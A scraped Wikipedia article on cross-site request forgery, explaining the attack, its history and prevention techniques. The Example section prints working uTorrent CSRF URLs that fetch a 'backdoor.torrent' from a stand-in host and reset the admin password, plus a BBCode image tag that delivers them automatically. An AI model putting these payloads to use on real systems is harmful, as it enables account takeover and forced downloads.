=== Content from en.wikipedia.org_797762dd_20250126_065455.html ===
[Jump to content](#bodyContent)

Main menu

Main menu
move to sidebar
hide

Navigation

* [Main page](/wiki/Main_Page "Visit the main page [z]")
* [Contents](/wiki/Wikipedia%3AContents "Guides to browsing Wikipedia")
* [Current events](/wiki/Portal%3ACurrent_events "Articles related to current events")
* [Random article](/wiki/Special%3ARandom "Visit a randomly selected article [x]")
* [About Wikipedia](/wiki/Wikipedia%3AAbout "Learn about Wikipedia and how it works")
* [Contact us](//en.wikipedia.org/wiki/Wikipedia%3AContact_us "How to contact Wikipedia")

Contribute

* [Help](/wiki/Help%3AContents "Guidance on how to use and edit Wikipedia")
* [Learn to edit](/wiki/Help%3AIntroduction "Learn how to edit Wikipedia")
* [Community portal](/wiki/Wikipedia%3ACommunity_portal "The hub for editors")
* [Recent changes](/wiki/Special%3ARecentChanges "A list of recent changes to Wikipedia [r]")
* [Upload file](/wiki/Wikipedia%3AFile_upload_wizard "Add images or other media for use on Wikipedia")

[![](/static/images/icons/wikipedia.png)
![Wikipedia](/static/images/mobile/copyright/wikipedia-wordmark-en.svg)
![The Free Encyclopedia](/static/images/mobile/copyright/wikipedia-tagline-en.svg)](/wiki/Main_Page)

[Search](/wiki/Special%3ASearch "Search Wikipedia [f]")

Search

Appearance

* [Donate](https://donate.wikimedia.org/?wmf_source=donate&wmf_medium=sidebar&wmf_campaign=en.wikipedia.org&uselang=en)
* [Create account](/w/index.php?title=Special:CreateAccount&returnto=Cross-site+request+forgery "You are encouraged to create an account and log in; however, it is not mandatory")
* [Log in](/w/index.php?title=Special:UserLogin&returnto=Cross-site+request+forgery "You're encouraged to log in; however, it's not mandatory. [o]")

Personal tools

* [Donate](https://donate.wikimedia.org/?wmf_source=donate&wmf_medium=sidebar&wmf_campaign=en.wikipedia.org&uselang=en)
* [Create account](/w/index.php?title=Special:CreateAccount&returnto=Cross-site+request+forgery "You are encouraged to create an account and log in; however, it is not mandatory")
* [Log in](/w/index.php?title=Special:UserLogin&returnto=Cross-site+request+forgery "You're encouraged to log in; however, it's not mandatory. [o]")

Pages for logged out editors [learn more](/wiki/Help%3AIntroduction)

* [Contributions](/wiki/Special%3AMyContributions "A list of edits made from this IP address [y]")
* [Talk](/wiki/Special%3AMyTalk "Discussion about edits from this IP address [n]")

## Contents

move to sidebar
hide

* (Top)
* [1
  Characteristics](#Characteristics)
* [2
  History](#History)
* [3
  Example](#Example)
* [4
  Forging login requests](#Forging_login_requests)
* [5
  HTTP verbs and CSRF](#HTTP_verbs_and_CSRF)
* [6
  Other approaches to CSRF](#Other_approaches_to_CSRF)
* [7
  Effects](#Effects)
* [8
  Limitations](#Limitations)
* [9
  Prevention](#Prevention)

  Toggle Prevention subsection
  + [9.1
    Synchronizer token pattern](#Synchronizer_token_pattern)
  + [9.2
    Cookie-to-header token](#Cookie-to-header_token)
  + [9.3
    Double Submit Cookie](#Double_Submit_Cookie)
  + [9.4
    SameSite cookie attribute](#SameSite_cookie_attribute)
  + [9.5
    Client-side safeguards](#Client-side_safeguards)
  + [9.6
    Other techniques](#Other_techniques)
* [10
  See also](#See_also)
* [11
  References](#References)
* [12
  External links](#External_links)

Toggle the table of contents

# Cross-site request forgery

21 languages

* [العربية](https://ar.wikipedia.org/wiki/%D8%AA%D8%B2%D9%88%D9%8A%D8%B1_%D8%A7%D9%84%D8%B7%D9%84%D8%A8_%D8%B9%D8%A8%D8%B1_%D8%A7%D9%84%D9%85%D9%88%D8%A7%D9%82%D8%B9 "تزوير الطلب عبر المواقع – Arabic")
* [Català](https://ca.wikipedia.org/wiki/Cross-site_request_forgery "Cross-site request forgery – Catalan")
* [Čeština](https://cs.wikipedia.org/wiki/Cross-site_request_forgery "Cross-site request forgery – Czech")
* [Deutsch](https://de.wikipedia.org/wiki/Cross-Site-Request-Forgery "Cross-Site-Request-Forgery – German")
* [Ελληνικά](https://el.wikipedia.org/wiki/%CE%A0%CE%BB%CE%B1%CF%83%CF%84%CE%BF%CE%B3%CF%81%CE%AC%CF%86%CE%B7%CF%83%CE%B7_%CE%B1%CE%B9%CF%84%CE%AE%CE%BC%CE%B1%CF%84%CE%BF%CF%82_%CE%BC%CE%B5%CF%84%CE%B1%CE%BE%CF%8D_%CE%B9%CF%83%CF%84%CE%BF%CF%84%CF%8C%CF%80%CF%89%CE%BD "Πλαστογράφηση αιτήματος μεταξύ ιστοτόπων – Greek")
* [Español](https://es.wikipedia.org/wiki/Cross-site_request_forgery "Cross-site request forgery – Spanish")
* [فارسی](https://fa.wikipedia.org/wiki/%D8%AC%D8%B9%D9%84_%D8%AF%D8%B1%D8%AE%D9%88%D8%A7%D8%B3%D8%AA_%D9%85%DB%8C%D8%A7%D9%86%E2%80%8C%D9%88%D8%A8%E2%80%8C%DA%AF%D8%A7%D9%87%DB%8C "جعل درخواست میان‌وب‌گاهی – Persian")
* [Français](https://fr.wikipedia.org/wiki/Cross-site_request_forgery "Cross-site request forgery – French")
* [한국어](https://ko.wikipedia.org/wiki/%EC%82%AC%EC%9D%B4%ED%8A%B8_%EA%B0%84_%EC%9A%94%EC%B2%AD_%EC%9C%84%EC%A1%B0 "사이트 간 요청 위조 – Korean")
* [Italiano](https://it.wikipedia.org/wiki/Cross-site_request_forgery "Cross-site request forgery – Italian")
* [עברית](https://he.wikipedia.org/wiki/CSRF "CSRF – Hebrew")
* [Lombard](https://lmo.wikipedia.org/wiki/Cross_Site_Request_Forgery "Cross Site Request Forgery – Lombard")
* [Magyar](https://hu.wikipedia.org/wiki/Cross-site_request_forgery "Cross-site request forgery – Hungarian")
* [日本語](https://ja.wikipedia.org/wiki/%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88%E3%83%95%E3%82%A9%E3%83%BC%E3%82%B8%E3%82%A7%E3%83%AA "クロスサイトリクエストフォージェリ – Japanese")
* [Norsk bokmål](https://no.wikipedia.org/wiki/Forfalskning_av_foresp%C3%B8rsler_p%C3%A5_tvers_av_nettsteder "Forfalskning av forespørsler på tvers av nettsteder – Norwegian Bokmål")
* [Polski](https://pl.wikipedia.org/wiki/Cross-site_request_forgery "Cross-site request forgery – Polish")
* [Português](https://pt.wikipedia.org/wiki/Cross-site_request_forgery "Cross-site request forgery – Portuguese")
* [Русский](https://ru.wikipedia.org/wiki/%D0%9C%D0%B5%D0%B6%D1%81%D0%B0%D0%B9%D1%82%D0%BE%D0%B2%D0%B0%D1%8F_%D0%BF%D0%BE%D0%B4%D0%B4%D0%B5%D0%BB%D0%BA%D0%B0_%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81%D0%B0 "Межсайтовая подделка запроса – Russian")
* [Türkçe](https://tr.wikipedia.org/wiki/XSRF "XSRF – Turkish")
* [Українська](https://uk.wikipedia.org/wiki/%D0%9C%D1%96%D0%B6%D1%81%D0%B0%D0%B9%D1%82%D0%BE%D0%B2%D0%B0_%D0%BF%D1%96%D0%B4%D1%80%D0%BE%D0%B1%D0%BA%D0%B0_%D0%B7%D0%B0%D0%BF%D0%B8%D1%82%D1%83 "Міжсайтова підробка запиту – Ukrainian")
* [中文](https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0 "跨站请求伪造 – Chinese")

[Edit links](https://www.wikidata.org/wiki/Special%3AEntityPage/Q15401472#sitelinks-wikipedia "Edit interlanguage links")

* [Article](/wiki/Cross-site_request_forgery "View the content page [c]")
* [Talk](/wiki/Talk%3ACross-site_request_forgery "Discuss improvements to the content page [t]")

English

* [Read](/wiki/Cross-site_request_forgery)
* [Edit](/w/index.php?title=Cross-site_request_forgery&action=edit "Edit this page [e]")
* [View history](/w/index.php?title=Cross-site_request_forgery&action=history "Past revisions of this page [h]")

Tools

Tools
move to sidebar
hide

Actions

* [Read](/wiki/Cross-site_request_forgery)
* [Edit](/w/index.php?title=Cross-site_request_forgery&action=edit "Edit this page [e]")
* [View history](/w/index.php?title=Cross-site_request_forgery&action=history)

General

* [What links here](/wiki/Special%3AWhatLinksHere/Cross-site_request_forgery "List of all English Wikipedia pages containing links to this page [j]")
* [Related changes](/wiki/Special%3ARecentChangesLinked/Cross-site_request_forgery "Recent changes in pages linked from this page [k]")
* [Upload file](/wiki/Wikipedia%3AFile_Upload_Wizard "Upload files [u]")
* [Special pages](/wiki/Special%3ASpecialPages "A list of all special pages [q]")
* [Permanent link](/w/index.php?title=Cross-site_request_forgery&oldid=1267985212 "Permanent link to this revision of this page")
* [Page information](/w/index.php?title=Cross-site_request_forgery&action=info "More information about this page")
* [Cite this page](/w/index.php?title=Special:CiteThisPage&page=Cross-site_request_forgery&id=1267985212&wpFormIdentifier=titleform "Information on how to cite this page")
* [Get shortened URL](/w/index.php?title=Special:UrlShortener&url=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FCross-site_request_forgery)
* [Download QR code](/w/index.php?title=Special:QrCode&url=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FCross-site_request_forgery)

Print/export

* [Download as PDF](/w/index.php?title=Special:DownloadAsPdf&page=Cross-site_request_forgery&action=show-download-screen "Download this page as a PDF file")
* [Printable version](/w/index.php?title=Cross-site_request_forgery&printable=yes "Printable version of this page [p]")

In other projects

* [Wikibooks](https://en.wikibooks.org/wiki/Web_Application_Security_Guide/Cross-site_request_forgery_%28CSRF%29)
* [Wikidata item](https://www.wikidata.org/wiki/Special%3AEntityPage/Q15401472 "Structured data on this page hosted by Wikidata [g]")

Appearance
move to sidebar
hide

From Wikipedia, the free encyclopedia

Malicious website exploit where unauthorized commands are transmitted from a trusted user

**Cross-site request forgery**, also known as **one-click attack** or **session riding** and abbreviated as **CSRF** (sometimes pronounced *sea-surf*[[1]](#cite_note-Shiflett-1)) or **XSRF**, is a type of malicious [exploit](/wiki/Exploit_%28computer_security%29 "Exploit (computer security)") of a [website](/wiki/Website "Website") or web application where unauthorized commands are submitted from a [user](/wiki/User_%28computing%29 "User (computing)") that the web application trusts.[[2]](#cite_note-Ristic-2) There are many ways in which a malicious website can transmit such commands; specially-crafted image tags, hidden forms, and [JavaScript](/wiki/JavaScript "JavaScript")  [fetch](/wiki/XMLHttpRequest#Fetch_alternative "XMLHttpRequest") or XMLHttpRequests, for example, can all work without the user's interaction or even knowledge. Unlike [cross-site scripting](/wiki/Cross-site_scripting "Cross-site scripting") (XSS), which exploits the trust a user has for a particular site, CSRF exploits the trust that a site has in a user's browser.[[3]](#cite_note-Synopsys-3)
In a CSRF attack, an innocent end user is tricked by an attacker into submitting a web request that they did not intend. This may cause actions to be performed on the website that can include inadvertent client or server data leakage, change of session state, or manipulation of an end user's account.

The term "CSRF" is also used as an abbreviation in defences against CSRF attacks, such as techniques that use header data, form data, or cookies, to test for and prevent such attacks.

## Characteristics

[[edit](/w/index.php?title=Cross-site_request_forgery&action=edit&section=1 "Edit section: Characteristics")]

In a CSRF attack, the attacker's goal is to cause an innocent victim to unknowingly submit a maliciously crafted web request to a website that the victim has privileged access to. This web request can be crafted to include URL parameters, cookies and other data that appear normal to the web server processing the request. At risk are [web applications](/wiki/Web_application "Web application") that perform actions based on input from trusted and [authenticated](/wiki/Authentication "Authentication") users without requiring the user to [authorize](/wiki/Authorization "Authorization") (e.g. via a popup confirmation) the specific action. A user who is authenticated by a [cookie](/wiki/HTTP_cookie "HTTP cookie") saved in the user's [web browser](/wiki/Web_browser "Web browser") could unknowingly send an [HTTP](/wiki/HTTP "HTTP") request to a site that trusts the user and thereby cause an unwanted action.

A general property of web browsers is that they will automatically and invisibly include any cookies (including session cookies and others) used by a given domain in any web request sent to that domain. This property is exploited by CSRF attacks. In the event that a user is tricked into inadvertently submitting a request through their browser these automatically included cookies will cause the forged request to appear real to the web server and it will perform any appropriately requested actions including returning data, manipulating session state, or making changes to the victim's account.

In order for a CSRF attack to work, an attacker must identify a reproducible web request that executes a specific action such as changing an account password on the target page. Once such a request is identified, a link can be created that generates this malicious request and that link can be embedded on a page within the attacker's control.[[1]](#cite_note-Shiflett-1)[[4]](#cite_note-4) This link may be placed in such a way that it is not even necessary for the victim to click the link. For example, it may be embedded within an html image tag on an email sent to the victim which will automatically be loaded when the victim opens their email. Once the victim has clicked the link, their browser will automatically include any cookies used by that website and submit the request to the web server. The web server will not be able to identify the forgery because the request was made by a user that was logged in, and submitted all the requisite cookies.

Cross-site request forgery is an example of a [confused deputy attack](/wiki/Confused_Deputy "Confused Deputy") against a web browser because the web browser is tricked into submitting a forged request by a less privileged attacker.

CSRF commonly has the following characteristics:

* It involves sites that rely on a user's [identity](/wiki/Online_identity "Online identity").
* It exploits the site's trust in that identity.
* It tricks the user's browser into sending [HTTP](/wiki/HTTP "HTTP") requests to a target site where the user is already authenticated.
* It involves HTTP requests that have [side effects](/wiki/Side_effect_%28computer_science%29 "Side effect (computer science)").

## History

[[edit](/w/index.php?title=Cross-site_request_forgery&action=edit&section=2 "Edit section: History")]

CSRF Token vulnerabilities have been known and in some cases exploited since 2001.[[5]](#cite_note-Burns-5) Because it is carried out from the user's [IP address](/wiki/IP_address "IP address"), some website logs might not have evidence of CSRF.[[2]](#cite_note-Ristic-2) Exploits are under-reported, at least publicly, and as of 2007[[6]](#cite_note-6) there were few well-documented examples:

* The [Netflix](/wiki/Netflix "Netflix") website in 2006 had numerous vulnerabilities to CSRF, which could have allowed an attacker to perform actions such as adding a DVD to the victim's rental queue, changing the shipping address on the account, or altering the victim's login credentials to fully compromise the account.[[7]](#cite_note-7)
* The online banking web application of [ING Direct](/wiki/ING_Direct "ING Direct") was vulnerable to a CSRF attack that allowed illicit money transfers.[[8]](#cite_note-zeller-8)
* Popular video website [YouTube](/wiki/YouTube "YouTube") was also vulnerable to CSRF in 2008 and this allowed any attacker to perform nearly all actions of any user.[[8]](#cite_note-zeller-8)
* [McAfee Secure](/wiki/McAfee "McAfee") was also vulnerable to CSRF and it allowed attackers to change their company system. This is fixed in newer versions.[[9]](#cite_note-Mike-9)

## Example

[[edit](/w/index.php?title=Cross-site_request_forgery&action=edit&section=3 "Edit section: Example")]
[![](//upload.wikimedia.org/wikipedia/commons/thumb/e/eb/NVD-CVE-2007-1332.png/220px-NVD-CVE-2007-1332.png)](/wiki/File%3ANVD-CVE-2007-1332.png)

A [National Vulnerability Database](/wiki/National_Vulnerability_Database "National Vulnerability Database") page describing a CSRF vulnerability

Attackers who can find a reproducible link that executes a specific action on the target page while the victim is logged in can embed such link on a page they control and trick the victim into opening it.[[1]](#cite_note-Shiflett-1) The attack carrier link may be placed in a location that the victim is likely to visit while logged into the target site (for example, a discussion forum), or sent in an [HTML email](/wiki/HTML_email "HTML email") body or attachment. A real CSRF vulnerability in [uTorrent](/wiki/UTorrent "UTorrent") ([CVE-2008-6586](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2008-6586)) exploited the fact that its web console accessible at [localhost](/wiki/Localhost "Localhost"):8080 allowed critical actions to be executed using a simple GET request:

Force a [.torrent](/wiki/.torrent ".torrent") file download
http://localhost:8080/gui/?action=add-url&s=http://evil.example.com/backdoor.torrent
Change uTorrent administrator password
http://localhost:8080/gui/?action=setsetting&s=webui.password&v=eviladmin

Attacks were launched by placing malicious, automatic-action [HTML image elements](/wiki/HTML_element#Images_and_objects "HTML element") on forums and [email spam](/wiki/Email_spam "Email spam"), so that browsers visiting these pages would open them automatically, without much user action. People running vulnerable uTorrent version at the same time as opening these pages were susceptible to the attack.

CSRF attacks using image tags are often made from [Internet forums](/wiki/Internet_forum "Internet forum"), where users are allowed to post images but not [JavaScript](/wiki/JavaScript "JavaScript"), for example using [BBCode](/wiki/BBCode "BBCode"):

```
[img]http://localhost:8080/gui/?action=add-url&s=http://evil.example.com/backdoor.torrent[/img]

```

When accessing the attack link to the local uTorrent application at localhost:8080, the browser would also always automatically send any existing [cookies](/wiki/HTTP_cookie "HTTP cookie") for that domain. This general property of web browsers enables CSRF attacks to exploit their targeted vulnerabilities and execute hostile actions as long as the user is logged into the target website (in this example, the local uTorrent web interface) at the time of the attack.

In the uTorrent example described above, the attack was facilitated by the fact that uTorrent's web interface used [GET request](/wiki/GET_request "GET request") for critical state-changing operations (change credentials, download a file etc.), which [RFC](/wiki/RFC_%28identifier%29 "RFC (identifier)") [2616](https://datatracker.ietf.org/doc/html/rfc2616) explicitly discourages:

> In particular, the convention has been established that the GET and HEAD methods SHOULD NOT have the significance of taking an action other than retrieval. These methods ought to be considered "safe". This allows user agents to represent other methods, such as POST, PUT and DELETE, in a special way, so that the user is made aware of the fact that a possibly unsafe action is being requested.

Because of this assumption, many existing CSRF prevention mechanisms in [web frameworks](/wiki/Web_framework "Web framework") will **not** cover [GET requests](/wiki/GET_request "GET request"), but rather apply the protection only to HTTP methods that are intended to be state-changing.[[10]](#cite_note-10)

## Forging login requests

[[edit](/w/index.php?title=Cross-site_request_forgery&action=edit&section=4 "Edit section: Forging login requests")]

An attacker may forge a request to log the victim into a target website using the attacker's credentials; this is known as *login CSRF*. Login CSRF makes various novel attacks possible; for instance, an attacker can later log into the site with their legitimate credentials and view private information like activity history that has been saved in the account. This attack has been demonstrated against [Google](/wiki/Google "Google")[[11]](#cite_note-11) and [Yahoo](/wiki/Yahoo "Yahoo").[[12]](#cite_note-:0-12)

## HTTP verbs and CSRF

[[edit](/w/index.php?title=Cross-site_request_forgery&action=edit&section=5 "Edit section: HTTP verbs and CSRF")]

Depending on the type, the [HTTP](/wiki/Hypertext_Transfer_Protocol "Hypertext Transfer Protocol") [request methods](/wiki/Hypertext_Transfer_Protocol#Request_methods "Hypertext Transfer Protocol") vary in their susceptibility to the CSRF attacks (due to the differences in their handling by the [web browsers](/wiki/Web_browser "Web browser")). Therefore, the protective measures against an attack depend on the method of the HTTP request.

* In [HTTP GET](/wiki/HTTP_GET "HTTP GET") the CSRF exploitation is trivial, using methods described above, such as a simple [hyperlink](/wiki/Hyperlink "Hyperlink") containing manipulated parameters and automatically loaded by an [IMG tag](/wiki/HTML_element#Images_and_objects "HTML element"). By the HTTP specification however, GET should be used as a [safe method](/wiki/Hypertext_Transfer_Protocol#Safe_methods "Hypertext Transfer Protocol"), that is, not significantly changing user's state in the application. Applications using GET for such operations should switch to [HTTP POST](/wiki/HTTP_POST "HTTP POST") or use anti-CSRF protection.
* the [HTTP POST](/wiki/HTTP_POST "HTTP POST") vulnerability to CSRF depends on the usage scenario:
  + In simplest form of POST with data encoded as a [query string](/wiki/Query_string "Query string") (`field1=value1&field2=value2`) CSRF attack is easily implemented using a simple [HTML form](/wiki/Form_%28HTML%29 "Form (HTML)") and anti-CSRF measures must be applied.
  + If data is sent in any other format ([JSON](/wiki/JSON "JSON"), [XML](/wiki/XML "XML")) a standard method is to issue a POST request using [XMLHttpRequest](/wiki/XMLHttpRequest "XMLHttpRequest") with CSRF attacks prevented by [Same-origin policy](/wiki/Same-origin_policy "Same-origin policy") (SOP) and [Cross-origin resource sharing](/wiki/Cross-origin_resource_sharing "Cross-origin resource sharing") (CORS); there is a technique to send arbitrary content from a simple [HTML form](/wiki/Form_%28HTML%29 "Form (HTML)") using `ENCTYPE` attribute; such a fake request can be distinguished from legitimate ones by `text/plain` content type, but if this is not enforced on the server, CSRF can be executed[[13]](#cite_note-13)[[14]](#cite_note-14)
* other HTTP methods (PUT, DELETE etc.) can only be issued using [XMLHttpRequest](/wiki/XMLHttpRequest "XMLHttpRequest") with [Same-origin policy](/wiki/Same-origin_policy "Same-origin policy") (SOP) and [Cross-origin resource sharing](/wiki/Cross-origin_resource_sharing "Cross-origin resource sharing") (CORS) preventing CSRF; these measures however will not be active on websites that explicitly disable them using `Access-Control-Allow-Origin: *` header

## Other approaches to CSRF

[[edit](/w/index.php?title=Cross-site_request_forgery&action=edit&section=6 "Edit section: Other approaches to CSRF")]

Additionally, while typically described as a static type of attack, CSRF can also be dynamically constructed as part of a payload for a [cross-site scripting](/wiki/Cross-site_scripting "Cross-site scripting") attack, as demonstrated by the [Samy](/wiki/Samy_%28XSS%29 "Samy (XSS)") worm, or constructed on the fly from session information leaked via offsite content and sent to a target as a malicious URL. CSRF tokens could also be sent to a client by an attacker due to [session fixation](/wiki/Session_fixation "Session fixation") or other vulnerabilities, or guessed via a brute-force attack, rendered on a malicious page that generates thousands of failed requests. The attack class of "Dynamic CSRF", or using a per-client payload for session-specific forgery, was described[[15]](#cite_note-15) in 2009 by Nathan Hamiel and Shawn Moyer at the BlackHat Briefings,[[16]](#cite_note-16) though the taxonomy has yet to gain wider adoption.

A new vector for composing dynamic CSRF attacks was presented by Oren Ofer at a local OWASP chapter meeting in January 2012 – "AJAX Hammer – Dynamic CSRF".[[17]](#cite_note-17)[[18]](#cite_note-18)

## Effects

[[edit](/w/index.php?title=Cross-site_request_forgery&action=edit&section=7 "Edit section: Effects")]

Severity metrics have been issued for CSRF token vulnerabilities that result in [remote code execution](/wiki/Remote_code_execution "Remote code execution") with [root privileges](/wiki/Root_privileges "Root privileges")[[19]](#cite_note-19) as well as a vulnerability that can compromise a [root certificate](/wiki/Root_certificate "Root certificate"), which will completely undermine a [public key infrastructure](/wiki/Public_key_infrastructure "Public key infrastructure").[[20]](#cite_note-20)

## Limitations

[[edit](/w/index.php?title=Cross-site_request_forgery&action=edit&section=8 "Edit section: Limitations")]

|  | This section **does not [cite](/wiki/Wikipedia%3ACiting_sources "Wikipedia:Citing sources") any [sources](/wiki/Wikipedia%3AVerifiability "Wikipedia:Verifiability")**. Please help [improve this section](/wiki/Special%3AEditPage/Cross-site_request_forgery "Special:EditPage/Cross-site request forgery") by [adding citations to reliable sources](/wiki/Help%3AReferencing_for_beginners "Help:Referencing for beginners"). Unsourced material may be challenged and [removed](/wiki/Wikipedia%3AVerifiability#Burden_of_evidence "Wikipedia:Verifiability"). *(May 2018)* *([Learn how and when to remove this message](/wiki/Help%3AMaintenance_template_removal "Help:Maintenance template removal"))* |
| --- | --- |

Several things have to happen for cross-site request forgery to succeed:

1. The attacker must target either a site that doesn't check the [referrer header](/wiki/HTTP_referrer "HTTP referrer") or a victim with a browser or plugin that allows [referer spoofing](/wiki/Referer_spoofing "Referer spoofing").[[21]](#cite_note-21)
2. The attacker must find a form submission at the target site, or a URL that has side effects, that does something (e.g., transfers money, or changes the victim's e-mail address or password).
3. The attacker must determine the right values for all the forms or URL inputs; if any of them are required to be secret authentication values or IDs that the attacker can't guess, the attack will most likely fail (unless the attacker is extremely lucky in their guess).
4. The attacker must lure the victim to a web page with malicious code while the victim is logged into the target site.

The attack is blind: the attacker cannot see what the target website sends back to the victim in response to the forged requests, unless they exploit a [cross-site scripting](/wiki/Cross-site_scripting "Cross-site scripting") or other bug at the target website. Similarly, the attacker can only target any links or submit any forms that come up after the initial forged request if those subsequent links or forms are similarly predictable. (Multiple targets can be simulated by including multiple images on a page, or by using JavaScript to introduce a delay between clicks.)[[22]](#cite_note-22)

## Prevention

[[edit](/w/index.php?title=Cross-site_request_forgery&action=edit&section=9 "Edit section: Prevention")]

Most CSRF prevention techniques work by embedding additional authentication data into requests that allows the web application to detect requests from unauthorized locations.

### Synchronizer token pattern

[[edit](/w/index.php?title=Cross-site_request_forgery&action=edit&section=10 "Edit section: Synchronizer token pattern")]

[Synchronizer token pattern](/w/index.php?title=Synchronizer_token_pattern&action=edit&redlink=1 "Synchronizer token pattern (page does not exist)") (STP) is a technique where a token, a secret and unique value for each request, is embedded by the web application in all HTML forms and verified on the server side. The token may be generated by any method that ensures unpredictability and uniqueness (e.g. using a [hash chain](/wiki/Hash_chain "Hash chain") of random seed). This is called a anti-forgery token in ASP.NET. The attacker is thus unable to place a correct token in their requests to authenticate them.[[1]](#cite_note-Shiflett-1)[[23]](#cite_note-owasp-23)[[24]](#cite_note-Valhalla-24)

Example of STP set by [Django](/wiki/Django_%28web_framework%29 "Django (web framework)") in a HTML form:

```
<input type="hidden" name="csrfmiddlewaretoken" value="KbyUmhTLMpYj7CD2di7JKP1P3qmLlkPt" />

```

STP is the most compatible as it only relies on HTML, but introduces some complexity on the server side, due to the burden associated with checking validity of the token on each request. As the token is unique and unpredictable, it also enforces proper sequence of events (e.g. screen 1, then 2, then 3) which raises usability problem (e.g. user opens multiple tabs). It can be relaxed by using per session CSRF token instead of per request CSRF token.

### Cookie-to-header token

[[edit](/w/index.php?title=Cross-site_request_forgery&action=edit&section=11 "Edit section: Cookie-to-header token")]

Web applications that use [JavaScript](/wiki/JavaScript "JavaScript") for the majority of their operations may use the following anti-CSRF technique:

* On an initial visit without an associated server session, the web application sets a cookie. The cookie typically contains a random token which may remain the same for up to the life of the web session

```
Set-Cookie: __Host-csrf_token=i8XNjC4b8KVok4uw5RftR38Wgp2BFwql; Expires=Thu, 23-Jul-2015 10:25:33 GMT; Max-Age=31449600; Path=/; SameSite=Lax; Secure

```

* [JavaScript](/wiki/JavaScript "JavaScript") operating on the client side reads its value and copies it into a custom [HTTP header](/wiki/HTTP_header "HTTP header") sent with each transactional request

```
X-Csrf-Token: i8XNjC4b8KVok4uw5RftR38Wgp2BFwql

```

* The server validates presence and integrity of the token

Security of this technique is based on the assumption that only [JavaScript](/wiki/JavaScript "JavaScript") running on the client side of an HTTPS connection to the server that initially set the cookie will be able to read the cookie's value. JavaScript running from a rogue file or email should not be able to successfully read the cookie value to copy into the custom header. Even though the csrf-token **cookie** may be automatically sent with the rogue request, subject to the cookies SameSite policy, the server will still expect a valid X-Csrf-Token **header**.

The CSRF token itself should be unique and unpredictable. It may be generated randomly, or it may be derived from the [session token](/wiki/Session_cookie "Session cookie") using [HMAC](/wiki/HMAC "HMAC"):

```
csrf_token = HMAC(session_token, application_secret)

```

The CSRF token cookie must not have [httpOnly](/wiki/HttpOnly "HttpOnly") flag, as it is intended to be read by [JavaScript](/wiki/JavaScript "JavaScript") by design.

This technique is implemented by many modern frameworks, such as [Django](/wiki/Django_%28web_framework%29 "Django (web framework)")[[25]](#cite_note-25) and [AngularJS](/wiki/AngularJS "AngularJS").[[26]](#cite_note-26) Because the token remains constant over the whole user session, it works well with [AJAX](/wiki/AJAX "AJAX") applications, but does not enforce sequence of events in the web application.

The protection provided by this technique can be thwarted if the target website **disables** its [same-origin policy](/wiki/Same-origin_policy "Same-origin policy") using one of the following techniques:

* clientaccesspolicy.xml file granting unintended access to Silverlight controls[[27]](#cite_note-27)
* crossdomain.xml file granting unintended access to Flash movies[[28]](#cite_note-28)

### Double Submit Cookie

[[edit](/w/index.php?title=Cross-site_request_forgery&action=edit&section=12 "Edit section: Double Submit Cookie")]

Similarly to the cookie-to-header approach, but without involving JavaScript, a site can set a CSRF token as a cookie, and also insert it as a hidden field in each HTML form. When the form is submitted, the site can check that the cookie token matches the form token. The same-origin policy prevents an attacker from reading or setting cookies on the target domain, so they cannot put a valid token in their crafted form.[[29]](#cite_note-29)

The advantage of this technique over the Synchronizer pattern is that the token does not need to be stored on the server.

### SameSite cookie attribute

[[edit](/w/index.php?title=Cross-site_request_forgery&action=edit&section=13 "Edit section: SameSite cookie attribute")]

An additional "SameSite" attribute can be included when the server sets a cookie, instructing the browser on whether to attach the cookie to cross-site requests. If this attribute is set to "strict", then the cookie will only be sent on same-site requests, making CSRF ineffective. However, this requires the browser to recognise and correctly implement the attribute.[[30]](#cite_note-30)

### Client-side safeguards

[[edit](/w/index.php?title=Cross-site_request_forgery&action=edit&section=14 "Edit section: Client-side safeguards")]

Browser extensions such as RequestPolicy (for [Mozilla Firefox](/wiki/Mozilla_Firefox "Mozilla Firefox")) or uMatrix (for both Firefox and [Google Chrome](/wiki/Google_Chrome "Google Chrome")/[Chromium](/wiki/Chromium_%28web_browser%29 "Chromium (web browser)")) can prevent CSRF by providing a default-deny policy for cross-site requests. However, this can significantly interfere with the normal operation of many websites. The CsFire extension (also for Firefox) can mitigate the impact of CSRF with less impact on normal browsing, by removing authentication information from cross-site requests.

The [NoScript](/wiki/NoScript "NoScript") extension for Firefox mitigates CSRF threats by distinguishing trusted from untrusted sites, and removing authentication & payloads from POST requests sent by untrusted sites to trusted ones. The Application Boundary Enforcer module in NoScript also blocks requests sent from internet pages to local sites (e.g. localhost), preventing CSRF attacks on local services (such as uTorrent) or routers.

The Self Destructing Cookies extension for Firefox does not directly protect from CSRF, but can reduce the attack window, by deleting cookies as soon as they are no longer associated with an open tab.

### Other techniques

[[edit](/w/index.php?title=Cross-site_request_forgery&action=edit&section=15 "Edit section: Other techniques")]

Various other techniques have been used or proposed for CSRF prevention historically:

* Verifying that the request's headers contain `X-Requested-With` (used by [Ruby on Rails](/wiki/Ruby_on_Rails "Ruby on Rails") before v2.0 and [Django](/wiki/Django_%28web_framework%29 "Django (web framework)") before v1.2.5), or checking the HTTP `Referer` header and/or HTTP `Origin` header.[[31]](#cite_note-31)
* Checking the [HTTP `Referer` header](/wiki/HTTP_referer "HTTP referer") to see if the request is coming from an authorized page is commonly used for embedded network devices because it does not increase memory requirements. However, a request that omits the `Referer` header must be treated as unauthorized because an attacker can suppress the `Referer` header by issuing requests from FTP or HTTPS URLs. This strict `Referer` validation may cause issues with browsers or proxies that omit the `Referer` header for privacy reasons. Also, old versions of Flash (before 9.0.18) allow malicious Flash to generate GET or POST requests with arbitrary HTTP request headers using [CRLF Injection](/wiki/HTTP_response_splitting "HTTP response splitting").[[32]](#cite_note-32) Similar CRLF injection vulnerabilities in a client can be used to spoof the referrer of an HTTP request.
